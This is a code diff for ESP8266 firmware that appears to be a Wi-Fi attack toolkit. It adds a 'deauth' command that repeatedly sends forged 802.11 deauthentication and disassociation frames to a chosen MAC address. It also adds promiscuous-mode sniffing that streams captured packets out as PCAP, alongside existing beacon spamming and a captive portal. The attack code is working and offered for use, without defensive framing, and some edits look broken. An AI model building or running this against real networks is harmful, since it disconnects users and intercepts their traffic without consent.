@@ -10,6 +10,15 @@
 #include "./DNSServer.h"
 #include <ESP8266WebServer.h>
 #include <string.h>
+#include <Arduino.h>
+#include "PCAP.h"
+
+#define CHANNEL 1
+#define BAUD_RATE 230400
+#define CHANNEL_HOPPING true //if true it will scan on all channels
+#define MAX_CHANNEL 11 //(only necessary if channelHopping is true)
+#define HOP_INTERVAL 214 //in ms (only necessary if channelHopping is true)
+
 char hostname[128];
 
 char ssid[32];
@@ -28,19 +37,30 @@ DNSServer dnsServer;
 
 
 const uint8_t channels[] = {1, 6, 11};
-const bool wpa2 = false; 
-const bool appendSpaces = true;
-
 // run-time variables
 char emptySSID[32];
 uint8_t channelIndex = 0;
-uint8_t macAddr[6];
+uint8_t macAddr[] = {100, 112, 148, 109, 56, 18};
 uint8_t wifi_channel = 1;
 uint32_t currentTime = 0;
 uint32_t packetSize = 0;
 uint32_t packetCounter = 0;
 uint32_t attackTime = 0;
 uint32_t packetRateTime = 0;
+
+
+uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
+
+uint8_t d_packet[26] = {
+    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
+    /*  2 - 3  */ 0x3A, 0x01,                         // duration (SDK takes care of that)
+    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
+    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
+    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
+    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
+    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
+};
+uint8_t targ[6];
 
 char **ssids;
 int ssid_amount;
@@ -66,14 +86,6 @@ void nextChannel() {
     }
   }
 }
-
-// Random MAC generator
-void randomMac() {
-  for (int i = 0; i < 6; i++){
-     macAddr[i] = random(256);
-  }
-}
-
 
 // beacon frame definition
 uint8_t beaconPacket[109] = {
@@ -248,38 +260,45 @@ void setup() {
   for (int i = 0; i < 32; i++)
     emptySSID[i] = ' ';
 
-  // for random generator
-  randomSeed(os_random());
+
 
   // set packetSize
   packetSize = sizeof(beaconPacket);
-  if (wpa2) {
-    beaconPacket[34] = 0x31;
-  } else {
-    beaconPacket[34] = 0x21;
-    packetSize -= 26;
-  }
-
-  randomMac();
+  beaconPacket[34] = 0x21;
+  packetSize -= 26;
 
   // get time
   currentTime = millis();
-
-  // start WiFi
-  WiFi.mode(WIFI_OFF);
-  wifi_set_opmode(STATION_MODE);
 
   // Set to default WiFi channel
   wifi_set_channel(channels[0]);
 }
 
+PCAP pcap = PCAP();
+int ch = CHANNEL;
+unsigned long lastChannelChange = 0;
+
+void sniff_packet(uint8_t *packet, uint16_t len) {
+  uint32_t timestamp = millis();
+  uint32_t microseconds = (unsigned int)(micros() - millis() * 1000);
+  pcap.newPacketSerial(timestamp, microseconds, len, packet); //log packets
+}
+
 bool spamming_beacons = false;
 bool is_running = false;
 bool logging_http = true;
+bool is_pcap = false;
+bool deauthing = false;
 
 struct station_info *stat_info;
 struct ip_addr *IPaddress;
 IPAddress address;
+
+String peter_griffin_lowercase(int i) {
+    String bs = WiFi.BSSIDstr(i);
+    bs.toLowerCase();
+    return bs;
+}
 
 void handleCommand(char **args, int index){
   Serial.println();
@@ -297,6 +316,8 @@ void handleCommand(char **args, int index){
     Serial.println("stop-beacons");
     Serial.println("esptap-help");
     Serial.println("esptap [arguments]");
+    Serial.println("pcap enable");
+    Serial.println("pcap disable");
     Serial.println("network-scan");
   }else if(strcmp(args[0], "esptap-help") == 0){
     Serial.println("ESPTAP help:");
@@ -494,6 +515,10 @@ void handleCommand(char **args, int index){
     Serial.println();
     Serial.print("END FILE");
   }else if(strcmp(args[0], "spam-beacons") == 0){
+
+    WiFi.mode(WIFI_OFF);
+    wifi_set_opmode(STATION_MODE);
+
     Serial.println("[...] Loading SSIDS");
     char *file = (char *)malloc(sizeof(char) * strlen(args[1]) + 2);
     strcpy(file, "/");
@@ -508,19 +533,17 @@ void handleCommand(char **args, int index){
       Serial.println(line);
       i++;
     }
-    i--;
     Serial.print("[OK] Read ");
     Serial.print(i);
     Serial.println(" SSIDS to memory");
 
     //load ssids into a c-string array
 
-    Serial.println("[...] Sending Signal to malloc()");
     ssids = (char **)malloc(sizeof(char *) * i);
     ssid_amount = i;
 
     for(int j = 0; j < i; j++){
-      ssids[j] = (char *)malloc(sizeof(char) * strlen(ssid_buffer[j].c_str()) + 1);
+      ssids[j] = (char *)malloc(sizeof(char) * (strlen(ssid_buffer[j].c_str()) + 1));
       strcpy(ssids[j], ssid_buffer[j].c_str());
     }
 
@@ -562,6 +585,73 @@ void handleCommand(char **args, int index){
         Serial.println(WiFi.channel(i));
       }
     }
+  }else if(strcmp(args[0], "deauth") == 0){
+    if(strcmp(args[1], "pow") == 0){
+      wifi_set_opmode(0x1);
+
+      de_parseMac(args[2], targ);
+      Serial.print("Deauth operation started for ");
+      Serial.println(parseMac(targ));
+      deauthing = true;
+    }else if(strcmp(args[1], "disable") == 0){
+      deauthing = false;
+    }
+  }else if(strcmp(args[0], "pcap") == 0){
+    if(strcmp(args[1], "enable") == 0){
+      Serial.println("[...] Starting PCAP");
+      pcap.startSerial();
+      Serial.println("[OK] Started PCAP");
+
+      Serial.println("[...] Putting Down Reciever");
+      WiFi.mode(WIFI_STA);
+      Serial.println("[OK] Put down reciever");
+      Serial.println("[...] Disconnecting Interface");
+      WiFi.disconnect();
+      Serial.println("[OK] Ready to scan!");
+      delay(100);
+      Serial.println("Scanning for networks!");
+      int n = WiFi.scanNetworks();
+      if(n == 0){
+        Serial.println("Scan complete!");
+        Serial.println("No Networks Discovered!");
+      }else{
+        Serial.println("Scan complete!");
+        Serial.print(n);
+        Serial.println(" networks found!");
+        for(int i = 0; i < n; i++){
+          //Serial.println("---------------");
+          //Serial.print("#");
+          //Serial.println(i);
+          //Serial.print("SSID:");
+          //Serial.println(WiFi.SSID(i));
+          //Serial.print("RSSI:");
+          //Serial.println(WiFi.RSSI(i));
+          //Serial.print("BSSID:");
+          //Serial.println(WiFi.BSSIDstr(i));
+          //Serial.print("Channel:");
+          //Serial.println(WiFi.channel(i));
+          pcap.setup(WiFi.SSID(i).c_str(), peter_griffin_lowercase(i).c_str());
+        }
+      }
+
+
+      Serial.println("[...] Setting up Network Chip");
+      wifi_set_opmode(STATION_MODE);
+      wifi_promiscuous_enable(0);
+      WiFi.disconnect();
+      wifi_set_promiscuous_rx_cb(sniff_packet);
+      wifi_set_channel(ch);
+      wifi_promiscuous_enable(1);
+      Serial.println("[OK] Setup Network Chip");
+
+      is_pcap = true;
+    }else if(strcmp(args[1], "disable") == 0){
+      Serial.println("[...] Setting up Network Chip");
+      WiFi.disconnect();
+      wifi_promiscuous_enable(0);
+      Serial.println("[OK] Setup Network Chip");
+      is_pcap = false;
+    }
   }else{ 
     Serial.println("No such command found! type help to get a list of commands");
   }
@@ -599,6 +689,68 @@ void http_handle(){
   server.send(200, "text/html", html_text);
 }
 
+char *parseMac(uint8_t *mac){
+  char* macStr = (char *)malloc(sizeof(char) * 17);
+  memset(macStr, '\0', sizeof(char) * 17);
+
+  sprintf(macStr, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+
+  return macStr;
+}
+
+void de_parseMac(const char* macStr, uint8_t* mac) {
+    char* token = strtok((char*)macStr, ":");
+    for (int i = 0; i < 6; i++) {
+        mac[i] = strtol(token, NULL, 16);
+        token = strtok(NULL, ":");
+    }
+}
+
+void deauth_network(uint8_t channel){
+  Serial.print("1");
+  uint16_t packsize = sizeof(d_packet);
+  char *macstr = parseMac(targ);
+
+  uint8_t reason = 1;
+
+  memcpy(&d_packet[4], targ, 6);
+  memcpy(&d_packet[10], broadcast, 6);
+  memcpy(&d_packet[16], targ, 6);
+  d_packet[24] = reason;
+  d_packet[0] = 0xc0;
+  nextChannel();
+
+  Serial.print("2");
+  Serial.print("3");
+
+  for (int i = 0; i < sizeof(d_packet); i++) {
+      Serial.print("0x");
+      Serial.print((unsigned long) &d_packet[i], HEX);
+      Serial.print(": ");
+      Serial.print(d_packet[i], HEX);
+      Serial.print(" ");
+  }
+  Serial.println();
+
+  int send = wifi_send_pkt_freedom(d_packet, 26, 0);
+  if(send == 0){
+    Serial.print("Deauth -> ");
+    Serial.println(macstr);
+  }else{ 
+    Serial.print("ERR -> ");
+    Serial.println(send);
+  }
+  d_packet[0] = 0xa0;
+  int send2 = wifi_send_pkt_freedom(d_packet, 26, 0);
+  if(send2 == 0){
+    Serial.print("Disassociate -> ");
+    Serial.println(macstr);
+  }else{ 
+    Serial.print("ERR -> ");
+    Serial.println(send2);
+  }
+}
+
 void loop() {
   if(is_running){
     dnsServer.processNextRequest();
@@ -618,6 +770,20 @@ void loop() {
     Serial.println();
     charEndSequence();
   }
+  if(is_pcap){
+    if(CHANNEL_HOPPING){
+      unsigned long currentTime = millis();
+      if(currentTime - lastChannelChange >= HOP_INTERVAL){
+        lastChannelChange = currentTime;
+        ch++; //increase channel
+        if(ch > MAX_CHANNEL) ch = 1;
+        wifi_set_channel(ch); //switch to new channel
+      }
+    }
+  }
+  if(deauthing){
+    deauth_network(6);
+  }
   if(spamming_beacons){
     currentTime = millis();
 
@@ -628,7 +794,7 @@ void loop() {
 
       // temp variables
       int i = 0;
-      int ssidNum = 1;
+      int ssidNum = 12;
 
       // Go to next channel
       nextChannel();
@@ -649,7 +815,7 @@ void loop() {
         memcpy(&beaconPacket[38], emptySSID, 32);
 
         // write new SSID into beacon frame
-        memcpy(&beaconPacket[38], ssids[i], ssidLen);
+        memcpy(&beaconPacket[38], ssid, ssidLen + 1);
 
         // set channel for beacon frame
         beaconPacket[82] = wifi_channel;
